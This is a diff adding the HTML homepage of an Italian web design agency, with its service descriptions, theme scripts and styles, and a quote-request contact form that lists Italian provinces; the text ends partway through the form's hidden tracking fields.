@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg no-smil svgclippaths"
+      lang="en-US" xmlns:padding="http://www.w3.org/1999/xhtml"><head>
+    <link rel="stylesheet" type="text/css" href="css/style.css"/>
+    <link rel="stylesheet" type="text/css" href="popup.css"/>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width">
+
+
+    <title>Àncora Design Web</title>
+    <link rel="icon" href="images/favicon.ico" />
+    <link href="//fonts.googleapis.com" rel="dns-prefetch">
+    <link href="//s.w.org" rel="dns-prefetch">
+
+    <script src="https://google-analytics.com/analytics.js" async=""></script><script type="text/javascript">
+    window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.vmthemes.com\/preview\/Initio\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.7.6"}};
+    !function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),!(j.toDataURL().length<3e3)&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,65039,8205,55356,57096),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,55356,57096),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55357,56425,55356,57341,8205,55357,56507),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55357,56425,55356,57341,55357,56507),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+</script><script src="js/wp-emoji-release.min.js" defer="" type="text/javascript"></script>
+    <style type="text/css">
+        img.wp-smiley,
+        img.emoji {
+            display: inline !important;
+            border: none !important;
+            box-shadow: none !important;
+            height: 1em !important;
+            width: 1em !important;
+            margin: 0 .07em !important;
+            vertical-align: -0.1em !important;
+            background: none !important;
+            padding: 0 !important;
+        }
+
+        li {
+            background-image: ("images/slide1.jpg";
+            width: 1524px;
+            float: left;
+        }
+    </style>
+    <link id="contact-form-7-css" href="css/editor-style.css" rel="stylesheet" type="text/css" media="all">
+    <link id="bootstrap-css" href="css/bootstrap.css" rel="stylesheet" type="text/css" media="all">
+    <link id="initio-css" href="css/style.css" rel="stylesheet" type="text/css" media="all">
+    <link id="initio-animate-css" href="css/animate.css" rel="stylesheet" type="text/css" media="all">
+    <link id="initio-responsive-css" href="css/responsive.css" rel="stylesheet" type="text/css" media="all">
+    <link rel="stylesheet" href="css/font-awesome-4.7.0/css/font-awesome.css" type="text/css">
+    <link id="initio-body-font-css" href="//fonts.googleapis.com/css?family=Raleway%3A400%2C400italic%2C700%2C700italic&amp;subset=latin%2Cgreek-ext%2Ccyrillic%2Clatin-ext%2Cgreek%2Ccyrillic-ext%2Cvietnamese&amp;ver=4.7.6" rel="stylesheet" type="text/css" media="all">
+    <link id="initio-menu-font-css" href="//fonts.googleapis.com/css?family=Raleway%3A400%2C400italic%2C700%2C700italic&amp;subset=latin%2Cgreek-ext%2Ccyrillic%2Clatin-ext%2Cgreek%2Ccyrillic-ext%2Cvietnamese&amp;ver=4.7.6" rel="stylesheet" type="text/css" media="all">
+    <link id="initio-logo-font-css" href="//fonts.googleapis.com/css?family=Raleway%3A400%2C400italic%2C700%2C700italic&amp;subset=latin%2Cgreek-ext%2Ccyrillic%2Clatin-ext%2Cgreek%2Ccyrillic-ext%2Cvietnamese&amp;ver=4.7.6" rel="stylesheet" type="text/css" media="all">
+
+
+    <script>
+        if (document.location.protocol != "https:") {
+            document.location = document.URL.replace(/^http:/i, "https:");
+        }
+    </script>
+    <script src="js/jquery.js" type="text/javascript"></script>
+    <script src="js/jquery-migrate.min.js" type="text/javascript"></script>
+    <script src="js/bootstrap.js" type="text/javascript"></script>
+    <script src="js/jquery.smartmenus.js" type="text/javascript"></script>
+    <script src="js/jquery.smartmenus.bootstrap.js" type="text/javascript"></script>
+    <script src="js/imgLiquid.js" type="text/javascript"></script><style type="text/css">.imgLiquid img {visibility:hidden}</style>
+    <script src="js/modernizr.js" type="text/javascript"></script>
+    <script src="js/stickUp.js" type="text/javascript"></script>
+    <script src="js/sticky.js" type="text/javascript"></script>
+    <script src="js/wow.js" type="text/javascript"></script>
+    <script language="JavaScript" type="text/javascript" src="js/cookielaw_mip.js"></script>
+    <!--[if lt IE 9]>
+    <script type='text/javascript' src='js/html5.js'></script>
+    <![endif]-->
+
+
+
+
+    <link href="js/embed?url=https%3A%2F%2Fwww.vmthemes.com%2Fpreview%2FInitio%2F" rel="alternate" type="application/json+oembed">
+    <link href="js/embed?url=https%3A%2F%2Fwww.vmthemes.com%2Fpreview%2FInitio%2F&amp;format=xml" rel="alternate" type="text/xml+oembed">
+    <!--Custom Styling-->
+    <style type="text/css" media="screen">
+        blockquote, address, .page-links a:hover, .post-format-wrap {border-color:#10b4d1}
+        .meta span i, .more-link, .post-title h3:hover, #main .standard-posts-wrapper .posts-wrapper .post-single .text-holder-full .post-format-wrap p.link-text a:hover, .breadcrumbs .breadcrumbs-wrap ul li a:hover, #article p a, .navigation a, .link-post i.fa, .quote-post i.fa, #article .link-post p.link-text a:hover, .link-post p.link-text a:hover, .quote-post span.quote-author, .post-single ul.link-pages li a strong, .post-info span i, .footer-widget-col ul li a:hover, .sidebar ul.link-pages li.next-link a span, .sidebar ul.link-pages li.previous-link a span, .sidebar ul.link-pages li i, .sidebar .widget-title h4, .btn-default:hover, .post-tags a, .post-title h2:hover {color:#10b4d1}
+        input[type=&quot;submit&quot;],button, .page-links a:hover {background:#10b4d1}
+        .search-submit,.wpcf7-form-control,.main-navigation ul ul, .content-boxes .circle, .section-title-right:after, .boxtitle:after, .section-title:after, #services h2:after, .content-btn, #comments .form-submit #submit, .post-button, .simple-pagination span, .pagination span, .pagination a {background-color:#10b4d1}
+        .back-to-top {color:#888888}
+        .back-to-top i.fa:hover {color:#10b4d1}
+        #logo {width:300px }
+        #logo {height:30px }
+        #logo { margin-top:8px }
+        #logo { margin-right:25px }
+        #logo {text-transform: uppercase }
+        #logo {font-family:Raleway}
+        #logo {font-size:28px }
+        #logo {font-weight:400}
+        #logo a {color:#000000}
+        #logo h5.site-description {font-size:16px }
+        #logo .site-description {color:#000000}
+        #logo .site-description {text-transform: uppercase}
+        #navbar ul li a {font-family:Raleway}
+        #navbar ul li a {font-size:13px}
+        #navbar ul li a {text-transform: uppercase;}
+        .navbar-nav li a {color:#000000}
+        .dropdown-menu {border-bottom: 5px solid #000000}
+        .navbar-nav {background-color:#ffffff}
+        .dropdown-menu { background:#10b4d1}
+        .navbar-nav li a:hover {color:#10b4d1}
+        .navbar-nav ul li a:hover, .navbar-nav ul li a:focus, .navbar-nav ul li a.active, .navbar-nav ul li a.active-parent, .navbar-nav ul li.current_page_item a, #menu-navmenu li a:hover { background:#f2f2f2}
+        .active a { color:#dd3333 !important}
+        body {font-family:Raleway}
+        body, p {font-size:14px}
+        body {color:#252525}
+        #header-holder { background-color: #ffffff}
+        #header-holder {opacity:1}
+        #header-top .top-phone,#header-top p, #header-top a, #header-top i { color:#ffffff}
+        #header-top { background-color: #10b4d1}
+        .banner ul li { height:500px;}
+        .banner .inner h1 { color:#ffffff}
+        .iis-caption-title a { color:#ffffff}
+        .banner .inner p { color: #ffffff}
+        .iis-caption-content p { color: #ffffff}
+        .banner .btn { color: #ffffff}
+        .banner .btn { border-color: #ffffff}
+        .banner .inner { padding-left: 10%}
+        .iis-caption { left: 10%}
+        .banner .inner { padding-top: 120px}
+        .iis-caption { bottom: 5%}
+        .banner .inner { width: 80%}
+        .iis-caption { max-width: 80%}
+        .ideal-image-slider .iis-caption .iis-caption-title a { font-size: 24px}
+        .ideal-image-slider .iis-caption .iis-caption-title a { line-height: 24px}
+        .iis-caption-content p { font-size: 14px}
+        #footer { background-color:#252525}
+        #copyright { background-color:#111111}
+        .footer-widget-col h4 { color:#ffffff}
+        .footer-widget-col h4 { border-bottom: 4px solid #444444}
+        .footer-widget-col a, .footer-widget-col { color:#ffffff}
+        .footer-widget-col ul li { border-bottom: 1px solid #444444}
+        #social-bar-footer ul li a i { color:#efefef}
+        .home-blog {background: none repeat scroll 0 0 #efefef}
+        .from-blog .post-info span a, .from-blog .post-info span {color:#111111;}
+        .from-blog h3 {color:#111111;}
+        .from-blog h2 {color:#111111;}
+        .from-blog {background: none repeat scroll 0 0 #ffffff;}
+        .blog-top-image {background: none repeat scroll 0 0 #efefef;}
+        .blog-top-image h1.section-title, .blog-top-image h1.section-title-right {color:#111111;}
+        #features { background-color:#ffffff;}
+        h4.sub-title, #features p { color:#111111;}
+        #features .section-title, #features h3 { color:#111111;}
+        .about p {color:#ffffff;}
+        .about h2, .about h2 a {color:#ffffff;}
+        .about {background: none repeat scroll 0 0 #252525;}
+        #services { background-color:#ffffff;}
+        #services h2, #services h3 { color:#111111;}
+        #services p { color:#777777;}
+        .get-in-touch { background-color: #252525}
+        .get-in-touch h2.boxtitle, .get-in-touch h2.boxtitle a {color:#ffffff;}
+        .get-in-touch h4.sub-title, .get-in-touch p {color:#ffffff;}
+        .git-link { color: #ffffff}
+        .git-link { border-color: #ffffff}
+        .social { background-color: #ffffff}
+    </style>
+    <style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+    <style id="custom-background-css" type="text/css">
+        body.custom-background { background-color: #ffffff; }
+    </style>
+</head>
+<body class="home page-template page-template-template-home page-template-template-home-php page page-id-1784 custom-background" data-rsssl="1">
+<div id="grid-container">
+    <div class="clear"></div>
+
+    <div class="stuckMenu" id="header-holder" style="top: 0px; position: relative;">
+    <div id="header-wrap">
+        <nav class="navbar navbar-default">
+            <div id="logo">
+                <img src="images/logo.png" style="height: 77px">
+                <a style="top: -30px; position: relative;">Design Web</a>
+            </div>
+            <div class="navbar-header">
+                <button class="navbar-toggle collapsed" aria-expanded="false" aria-controls="navbar" type="button" data-toggle="collapse" data-target="#navbar">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+            </div><!--navbar-header-->
+            <div class="navbar-collapse collapse" id="navbar">
+                <ul class="nav navbar-nav sm" id="menu-mainmenu" data-smartmenus-id="15085838826346692">
+                    <li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-5 active" id="menu-item-5"><a title="Home" href="">Home</a></li>
+
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6" id="menu-item-6"><a title="Chi siamo" href=#chiSiamo>Chi siamo</a></li>
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6" id="menu-item-6"><a title="I nostri servizi" href=#servizi>I nostri servizi</a></li>
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6" id="menu-item-6"><a title="Come funziona" href=#comeF>Come funziona</a></li>
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6" id="menu-item-6"><a title="Perchè scegliere noi" href="#comeFunziona">Perchè scegliere noi</a></li>
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6" id="menu-item-6"><a title="Temi" href="Temi.html">Temi</a></li>
+                    <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2252" id="menu-item-2252"><a title="Contatti" href=#contatti>Contatti</a></li>
+                </ul>
+            </div><!--/.nav-collapse -->
+
+        </nav>
+    </div><!--header-wrap-->
+</div><!--header-holder-->
+    <div class="col2-l" id="main" style="margin-top: 0px;">
+    <div class="clear"></div>
+    <div class="banner has-dots has-arrows" style="width: 100%; height: 500px; overflow: hidden;">
+
+            <ul style="position: relative; left: -196.416%; width: 300%; height: 500px; overflow: hidden;">
+                <li style="background: url('images/slide1.jpg') 50% 0px no-repeat; float: left; width: 950px;">
+
+                    <div class="inner">
+
+                            <center><h1>La nostra professionalità al tuo servizio.</h1></center>
+                        <p> </p>
+                    </div>
+
+                </li>
+                <li style="background: url('images/slide2.jpg') 50% 0px no-repeat; float: left; width: 950px;">
+
+                    <div class="inner">
+
+                            <h1>Hai avviato da poco un'attività o vuoi aumentare la tua visibilità?</h1>
+                        <h1>Il modo migliore è iniziare da noi.</h1>
+                    </div>
+
+
+                </li>
+                <li style="background: url('images/slide3.jpg') 50% 0px no-repeat; float: left; width: 950px;">
+
+                    <div class="inner">
+                        <h1 style="color: #2b2b2b"> Lo sapevi che l 80% di coloro che hanno un'attività si avvalgono di un proprio sito web? </h1>
+                        <h1 style="color: #2b2b2b"> Che aspetti allora, Manchi solo tu.</h1>
+                    </div>
+
+
+                </li>
+            </ul>
+
+
+        <ol class="dots"><li class="dot">1</li><li class="dot">2</li><li class="dot active">3</li></ol><div class="arrows"><div class="arrow prev">←</div><div class="arrow next">→</div></div></div>
+
+    <div class="clear"></div>
+
+    <div id="chiSiamo">
+    <div id="features" >
+
+        <div id="features-wrap">
+
+            <h2 class="section-title wow bounceInLeft" style="visibility: visible; animation-name: bounceInLeft; animation-delay: 0.1s;" data-wow-delay="0.1s" >Chi Siamo</h2>
+           <center><p style="padding-top: 40PX;font-size: 18px;">
+                Àncora Design Web è una società di professionisti nata dalla fusione di due realta’ imprenditoriali, si occupa della realizzazione di siti internet
+                e di visibilità on line.  I siti sono studiati e strutturati per essere visibili su tutti
+                i browsers esistenti al momento. Offre servizi web opzionali
+                quali consulenza e fornitura di Hosting professionale, validazione e restyling di siti web esistenti, posizionamento sui motori di ricerca.</p>
+            </center>
+        </div><!--feature-->
+            <!--aggiungi qui-->
+
+        </div><!--features-wrap-->
+    </div><!--features-->
+
+
+    <div id="servizi">
+         <div class="about">
+             <div id="about-wrap">
+                 <div>
+                     <h2 class="boxtitle wow bounceInLeft" style="visibility: visible; animation-name: bounceInLeft; animation-delay: 0.1s;" data-wow-delay="0.1s">I nostri servizi</h2>
+
+                </div>
+             </div>
+        </div>
+</div>
+
+    <div id="services">
+    <div id="services-wrap">
+        <div class="row-item height200 row-item-1">
+            <div class="service wow bounceIn" style="visibility: visible; animation-name: bounceIn; animation-delay: 0.2s;" data-wow-delay="0.2s">
+                <div class="services-left" style="padding: 9% 3% 3% 0;">
+                <!--<h2 class="wow bounceInLeft" data-wow-delay="0.1s" style="visibility: visible; animation-delay: 0.1s; animation-name: bounceInLeft;">I nostri servizi</h2>-->
+                    <div class="row">
+                        <div class="row-item height200 row-item-1">
+                            <div class="service wow bounceIn" data-wow-delay="0.2s" style="visibility: visible; animation-delay: 0.2s; animation-name: bounceIn;">
+                                <div class="service-head">
+                                    <div class="circle">
+                                        <i class="fa fa-anchor"></i>
+                                    </div>
+                                    <h3>SEO Professional</h3>
+                                </div>
+                                <p></p>
+                            </div>
+                        </div>
+                        <div class="row-item height200 row-item-2">
+                            <div class="service wow bounceIn" data-wow-delay="0.2s" style="visibility: visible; animation-delay: 0.2s; animation-name: bounceIn;">
+                                <div class="service-head">
+                                    <div class="circle">
+                                        <i class="fa fa-cog"></i>
+                                    </div>
+                                    <h3>Realizzazione Siti Web</h3>
+                                </div>
+                                <p></p>
+                            </div>
+                        </div>
+                        <div class="row-item height200 row-item-3">
+                            <div class="service wow bounceIn" data-wow-delay="0.2s" style="visibility: visible; animation-delay: 0.2s; animation-name: bounceIn;">
+                                <div class="service-head">
+                                    <div class="circle">
+                                        <i class="fa fa-tachometer"></i>
+                                    </div>
+                                    <h3>Siti E-Commerce</h3>
+                                </div>
+                                <p></p>
+                            </div>
+                        </div>
+                        <div class="row-item height200 row-item-4">
+                            <div class="service wow bounceIn" data-wow-delay="0.2s" style="visibility: visible; animation-delay: 0.2s; animation-name: bounceIn;">
+                                <div class="service-head">
+                                    <div class="circle">
+                                        <i class="fa fa-umbrella"></i>
+                                    </div>
+                                    <h3>Hosting Professionale</h3>
+                                </div>
+                                <p></p>
+                            </div>
+                        </div>
+                        <div class="row-item height200 row-item-5">
+                            <div class="service wow bounceIn" data-wow-delay="0.2s" style="visibility: visible; animation-delay: 0.2s; animation-name: bounceIn;">
+                                <div class="service-head">
+                                    <div class="circle">
+                                        <i class="fa fa-html5"></i>
+                                    </div>
+                                    <h3>Progetti di immagine </h3>
+                                </div>
+                                <p></p>
+                            </div>
+                        </div>
+                        <div class="row-item height200 row-item-6">
+                            <div class="service wow bounceIn" data-wow-delay="0.2s" style="visibility: visible; animation-delay: 0.2s; animation-name: bounceIn;">
+                                <div class="service-head">
+                                    <div class="circle">
+                                        <i class="fa fa-assistive-listening-systems"></i>
+                                    </div>
+                                    <h3>24/7 Assistenza</h3>
+                                </div>
+                                <p></p>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div><!--row-->
+        </div><!--services-left-->
+        <div class="services-right">
+            <img class="wow bounceIn" style="visibility: visible; animation-name: bounceIn; animation-delay: 1.4s; max-width: 150%" alt="Services" src="images/work.png" data-wow-delay="1.4s">
+        </div><!--services-right-->
+    </div><!--services-wrap-->
+</div><!--services-->
+
+
+    <div id="comeF">
+        <div class="about">
+            <div class="get-in-touch">
+                <div id="get-in-touch-wrap">
+                    <div>
+                        <h2 class="boxtitle wow bounceInLeft" style="visibility: visible; animation-name: bounceInLeft; animation-delay: 0.1s;" data-wow-delay="0.1s">Come funziona</h2>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="from-blog">
+            <div id="from-blog-wrap">
+
+                <center> <p  style="padding-top: 40PX;font-size: 18px;">
+                    Il cliente ha la possibilità di visionare diversi <a href="Temi.html"> temi</a>, scegliendo quello che rispecchia appieno
+                    le sue esigenze. In seguito, potrà contattarci per chiedere modifiche o ulteriori informazioni,
+                    il nostro team risponderà in tempi brevi adempiendo ad ogni richiesta.
+
+
+                <div>
+
+
+                </div>
+            </div>
+        </div>
+
+    <div id="features">
+        <div id="features-wrap">
+            <h2 class="section-title wow bounceInLeft" style="visibility: visible; animation-name: bounceInLeft; animation-delay: 0.1s;" data-wow-delay="0.1s">Il tuo sito in pochi e semplici passi</h2>
+
+            <div style="    padding-left: 224px;">
+            <h4 class="sub-title wow bounceInRight" style="visibility: visible; animation-name: bounceInRight; animation-delay: 0.2s;" data-wow-delay="0.2s"></h4>
+            <div class="feature feature-item-1 wow bounceIn" style="visibility: visible; animation-name: bounceIn; animation-delay: 0.2s;" data-wow-delay="0.2s">
+
+                    <div class="circle">
+                        <i class="fa fa-handshake-o fa-3x" aria-hidden="true"></i>
+                    </div><!--circle-->
+
+                <h3><a href="http://robaweb.it" rel="bookmark">1.</a></h3>
+                <p>Scegli la grafica più adatta alle tue esigenze.</p>
+            </div><!--feature-->
+            <div class="feature feature-item-2 wow bounceIn" style="visibility: visible; animation-name: bounceIn; animation-delay: 0.2s;" data-wow-delay="0.2s">
+
+                    <div class="circle">
+                        <i class="fa fa-paper-plane"></i>
+                    </div><!--circle-->
+
+                <h3><a href="http://robaweb.it" rel="bookmark">2.</a></h3>
+            <p>Inviaci i contenuti.</p>
+            </div><!--feature-->
+
+            <div class="feature feature-item-4 wow bounceIn" style="visibility: visible; animation-name: bounceIn; animation-delay: 0.2s;" data-wow-delay="0.2s">
+
+                    <div class="circle">
+                        <i class="fa fa-shopping-cart"></i>
+                    </div><!--circle-->
+
+                <h3><a href="http://robaweb.it" rel="bookmark">3.</a></h3>
+            <p>Il tuo sito è pronto in pochi giorni.</p>
+            </div><!--feature-->
+            <!--aggiungi qui-->
+
+        </div>
+        </div><!--features-wrap-->
+    </div><!--features-->
+
+    <div id="comeFunziona">
+    <div class="about">
+    	<div class="get-in-touch">
+    <div id="get-in-touch-wrap">
+        <div>
+            <h2 class="boxtitle wow bounceInLeft" style="visibility: visible; animation-name: bounceInLeft; animation-delay: 0.1s;" data-wow-delay="0.1s">Perchè scegliere noi</h2>
+            </div>
+            </div>
+        </div>
+
+    </div>
+
+        <div class="from-blog">
+            <div id="from-blog-wrap">
+
+               <center> <p  style="padding-top: 40PX;font-size: 18px;">
+                    Àncora Design Web ha come unica finalità la completa soddisfazione dei suoi clienti. Un team di professionisti esperti seguirà il cliente
+                    offrendogli un'assistenza completa, garantendo il miglior servizio al miglior prezzo.
+                    Professionalità, dedizione e costanza sono i punti cardine della nostra attività,
+                    grazie ai quali riusciamo a stabilire una duratura collaborazione con i nostri clienti.</p></center>
+
+
+                <div>
+
+
+                    </div>
+                    </div>
+                    </div>
+
+
+
+</div><!--main-->
+
+    <div class="about" id="contatti">
+        <div class="get-in-touch">
+            <div id="get-in-touch-wrap">
+                <div>
+                    <h2 class="boxtitle wow bounceInLeft" data-wow-delay="0.1s" style="visibility: visible; animation-delay: 0.1s; animation-name: bounceInLeft;">Contatti</h2>
+                    <p>Contattaci per un preventivo <strong>gratuito</strong></p>
+
+
+
+
+                </div>
+            </div>
+        </div>
+
+        <div class="from-blog">
+            <div id="from-blog-wrap">
+
+
+
+                    <h4>
+                        SCOPRI COME OTTENERE UN SITO EFFICACE E PERFORMANTE PER LA TUA ATTIVITÀ
+                    </h4>
+                    <center>
+                    <p style="font-size: 14px; font-style: normal;font-variant: normal; color: #888888;">Scrivici senza impegno sarai contattato in tempi brevi per darti ogni informazione.</p>
+                </center>
+
+                        <div id="services-wrap-contact form" >
+                            <div class="col-sm-6" >
+
+                        <form method="POST" action="_form/_form.php" accept-charset="UTF-8">
+                            <div class="form-group1">
+                                <input name="name" id="name" type="text" class="form-control" placeholder="Nome *" required="required" tabindex="1">
+                            </div>
+
+                            <div class="form-group1">
+                                <input name="surname" id="surname" type="text" class="form-control" placeholder="Cognome *" required="required" tabindex="2">
+                            </div>
+
+                            <div class="form-group1">
+                                <input name="email" id="email" type="email" class="form-control" placeholder="E-mail *" required="required" tabindex="3">
+                            </div>
+
+                            <div class="form-group1">
+                                <select name="province" id="province" class="form-control" required="required" tabindex="4">
+                                    <option value="" label="Provincia">Provincia *</option>
+                                    <option value="AG" label="Agrigento">Agrigento</option>
+                                    <option value="AL" label="Alessandria">Alessandria</option>
+                                    <option value="AN" label="Ancona">Ancona</option>
+                                    <option value="AO" label="Aosta">Aosta</option>
+                                    <option value="AR" label="Arezzo">Arezzo</option>
+                                    <option value="AP" label="Ascoli Piceno">Ascoli Piceno</option>
+                                    <option value="AT" label="Asti">Asti</option>
+                                    <option value="AV" label="Avellino">Avellino</option>
+                                    <option value="BA" label="Bari">Bari</option>
+                                    <option value="BL" label="Belluno">Belluno</option>
+                                    <option value="BN" label="Benevento">Benevento</option>
+                                    <option value="BG" label="Bergamo">Bergamo</option>
+                                    <option value="BI" label="Biella">Biella</option>
+                                    <option value="BO" label="Bologna">Bologna</option>
+                                    <option value="BZ" label="Bolzano">Bolzano</option>
+                                    <option value="BS" label="Brescia">Brescia</option>
+                                    <option value="BR" label="Brindisi">Brindisi</option>
+                                    <option value="CA" label="Cagliari">Cagliari</option>
+                                    <option value="CL" label="Caltanissetta">Caltanissetta</option>
+                                    <option value="CB" label="Campobasso">Campobasso</option>
+                                    <option value="CE" label="Caserta">Caserta</option>
+                                    <option value="CT" label="Catania">Catania</option>
+                                    <option value="CZ" label="Catanzaro">Catanzaro</option>
+                                    <option value="CH" label="Chieti">Chieti</option>
+                                    <option value="CO" label="Como">Como</option>
+                                    <option value="CS" label="Cosenza">Cosenza</option>
+                                    <option value="CR" label="Cremona">Cremona</option>
+                                    <option value="KR" label="Crotone">Crotone</option>
+                                    <option value="CN" label="Cuneo">Cuneo</option>
+                                    <option value="EN" label="Enna">Enna</option>
+                                    <option value="FE" label="Ferrara">Ferrara</option>
+                                    <option value="FI" label="Firenze">Firenze</option>
+                                    <option value="FG" label="Foggia">Foggia</option>
+                                    <option value="FO" label="Forlì-Cesena">Forlì-Cesena</option>
+                                    <option value="FR" label="Frosinone">Frosinone</option>
+                                    <option value="GE" label="Genova">Genova</option>
+                                    <option value="GO" label="Gorizia">Gorizia</option>
+                                    <option value="GR" label="Grosseto">Grosseto</option>
+                                    <option value="IM" label="Imperia">Imperia</option>
+                                    <option value="IS" label="Isernia">Isernia</option>
+                                    <option value="SP" label="La Spezia">La Spezia</option>
+                                    <option value="AQ" label="L'Aquila">L'Aquila</option>
+                                    <option value="LT" label="Latina">Latina</option>
+                                    <option value="LE" label="Lecce">Lecce</option>
+                                    <option value="LC" label="Lecco">Lecco</option>
+                                    <option value="LI" label="Livorno">Livorno</option>
+                                    <option value="LO" label="Lodi">Lodi</option>
+                                    <option value="LU" label="Lucca">Lucca</option>
+                                    <option value="MC" label="Macerata">Macerata</option>
+                                    <option value="MN" label="Mantova">Mantova</option>
+                                    <option value="MS" label="Massa-Carrara">Massa-Carrara</option>
+                                    <option value="MT" label="Matera">Matera</option>
+                                    <option value="ME" label="Messina">Messina</option>
+                                    <option value="MI" label="Milano">Milano</option>
+                                    <option value="MO" label="Modena">Modena</option>
+                                    <option value="NA" label="Napoli">Napoli</option>
+                                    <option value="NO" label="Novara">Novara</option>
+                                    <option value="NU" label="Nuoro">Nuoro</option>
+                                    <option value="OR" label="Oristano">Oristano</option>
+                                    <option value="PD" label="Padova">Padova</option>
+                                    <option value="PA" label="Palermo">Palermo</option>
+                                    <option value="PR" label="Parma">Parma</option>
+                                    <option value="PV" label="Pavia">Pavia</option>
+                                    <option value="PG" label="Perugia">Perugia</option>
+                                    <option value="PS" label="Pesaro e Urbino">Pesaro e Urbino</option>
+                                    <option value="PE" label="Pescara">Pescara</option>
+                                    <option value="PC" label="Piacenza">Piacenza</option>
+                                    <option value="PI" label="Pisa">Pisa</option>
+                                    <option value="PT" label="Pistoia">Pistoia</option>
+                                    <option value="PN" label="Pordenone">Pordenone</option>
+                                    <option value="PZ" label="Potenza">Potenza</option>
+                                    <option value="PO" label="Prato">Prato</option>
+                                    <option value="RG" label="Ragusa">Ragusa</option>
+                                    <option value="RA" label="Ravenna">Ravenna</option>
+                                    <option value="RC" label="Reggio di Calabria">Reggio di Calabria</option>
+                                    <option value="RE" label="Reggio nell'Emilia">Reggio nell'Emilia</option>
+                                    <option value="RI" label="Rieti">Rieti</option>
+                                    <option value="RN" label="Rimini">Rimini</option>
+                                    <option value="RM" label="Roma">Roma</option>
+                                    <option value="RO" label="Rovigo">Rovigo</option>
+                                    <option value="SA" label="Salerno">Salerno</option>
+                                    <option value="SS" label="Sassari">Sassari</option>
+                                    <option value="SV" label="Savona">Savona</option>
+                                    <option value="SI" label="Siena">Siena</option>
+                                    <option value="SR" label="Siracusa">Siracusa</option>
+                                    <option value="SO" label="Sondrio">Sondrio</option>
+                                    <option value="TA" label="Taranto">Taranto</option>
+                                    <option value="TE" label="Teramo">Teramo</option>
+                                    <option value="TR" label="Terni">Terni</option>
+                                    <option value="TO" label="Torino">Torino</option>
+                                    <option value="TP" label="Trapani">Trapani</option>
+                                    <option value="TN" label="Trento">Trento</option>
+                                    <option value="TV" label="Treviso">Treviso</option>
+                                    <option value="TS" label="Trieste">Trieste</option>
+                                    <option value="UD" label="Udine">Udine</option>
+                                    <option value="VA" label="Varese">Varese</option>
+                                    <option value="VE" label="Venezia">Venezia</option>
+                                    <option value="VB" label="Verbano-Cusio-Ossola">Verbano-Cusio-Ossola</option>
+                                    <option value="VC" label="Vercelli">Vercelli</option>
+                                    <option value="VR" label="Verona">Verona</option>
+                                    <option value="VV" label="Vibo Valentia">Vibo Valentia</option>
+                                    <option value="VI" label="Vicenza">Vicenza</option>
+                                    <option value="VT" label="Viterbo">Viterbo</option>
+
+                                </select>
+                            </div>
+
+                            <div class="form-group1">
+                                <input name="site" id="site" type="text" class="form-control" placeholder="Sito web *" required="required" tabindex="5">
+                            </div>
+
+                            <div class="form-group1">
+                                <input name="telephone" id="telephone" type="text" class="form-control" placeholder="Telefono *" required="required" tabindex="6" pattern="\d{5,}">
+                            </div>
+
+                            <div class="form-group1">
+                                <input name="denomination" id="denomination" type="text" class="form-control" placeholder="Azienda *" required="required" tabindex="7">
+                            </div>
+
+
+
+
+
+                            <!-- Hidden CRM Form -->
+                            <input name="city" id="city" type="hidden" value="-">
+                            <input name="address" id="adress" type="hidden" value="-">
+                            <input name="fax" id="fax" type="hidden" value="-">
+                            <input name="note" id="note" type="hidden" value="-">
+
+
+                            <!-- Hidden CRM Tracking -->
